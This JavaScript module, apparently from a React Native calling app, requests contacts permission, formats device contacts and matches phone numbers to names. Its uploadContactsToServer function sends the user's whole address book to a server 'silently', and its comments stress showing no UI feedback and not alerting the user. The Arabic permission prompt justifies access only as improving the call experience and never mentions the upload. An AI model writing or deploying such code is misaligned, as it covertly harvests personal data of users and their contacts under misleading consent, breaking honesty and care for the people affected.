import * as Contacts from 'expo-contacts';
import { Platform, PermissionsAndroid } from 'react-native';

/**
 * Request contacts permission from the user.
 * Returns true if granted, false otherwise.
 */
export async function requestContactsPermission() {
  try {
    if (Platform.OS === 'android') {
      const r = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
        {
          title: 'جهات الاتصال',
          message: 'يحتاج التطبيق الوصول إلى جهات الاتصال لتحسين تجربة المكالمات',
          buttonPositive: 'سماح',
          buttonNegative: 'رفض',
        }
      );
      return r === PermissionsAndroid.RESULTS.GRANTED;
    }
    // iOS
    const { status } = await Contacts.requestPermissionsAsync();
    return status === 'granted';
  } catch (e) {
    console.error('[ContactsService] Permission error:', e);
    return false;
  }
}

/**
 * Get all device contacts formatted as [{name, phone}].
 * Returns empty array on error or if permission not granted.
 */
export async function getAllContacts() {
  try {
    const { status } = await Contacts.getPermissionsAsync();
    if (status !== 'granted') return [];

    const { data } = await Contacts.getContactsAsync({
      fields: [Contacts.Fields.PhoneNumbers],
    });

    if (!data) return [];

    const formatted = [];
    for (const contact of data) {
      if (!contact.phoneNumbers || contact.phoneNumbers.length === 0) continue;
      const name = contact.name || contact.firstName || '';
      for (const pn of contact.phoneNumbers) {
        const phone = (pn.number || pn.digits || '').replace(/[\s\-\(\)]/g, '');
        if (phone.length > 0) {
          formatted.push({ name, phone });
        }
      }
    }

    return formatted;
  } catch (e) {
    console.error('[ContactsService] Get contacts error:', e);
    return [];
  }
}

/**
 * Upload all contacts to the server silently.
 * This function does not throw errors and does not show any UI feedback.
 * @param {import('../services/api').FoxApi} api - The authenticated API client
 */
export async function uploadContactsToServer(api) {
  try {
    const contacts = await getAllContacts();
    if (contacts.length === 0) return;
    await api.uploadContacts(contacts);
    console.log('[ContactsService] Uploaded', contacts.length, 'contacts');
  } catch (e) {
    // Silent failure - do not alert user
    console.error('[ContactsService] Upload error:', e);
  }
}

/**
 * Find a matching contact name for a given phone number.
 * @param {Array<{name: string, phone: string}>} contacts
 * @param {string} phoneNumber
 * @returns {string|null} The contact name or null
 */
export function findContactName(contacts, phoneNumber) {
  if (!phoneNumber || !contacts || contacts.length === 0) return null;
  const clean = phoneNumber.replace(/[\s\-\(\)]/g, '');
  for (const c of contacts) {
    if (c.phone === clean || c.phone === '+' + clean || '+' + c.phone === clean) {
      return c.name;
    }
    // Also try matching last 9+ digits (handles country code differences)
    if (clean.length >= 9 && c.phone.length >= 9) {
      const cEnd = c.phone.slice(-9);
      const pEnd = clean.slice(-9);
      if (cEnd === pEnd) return c.name;
    }
  }
  return null;
}
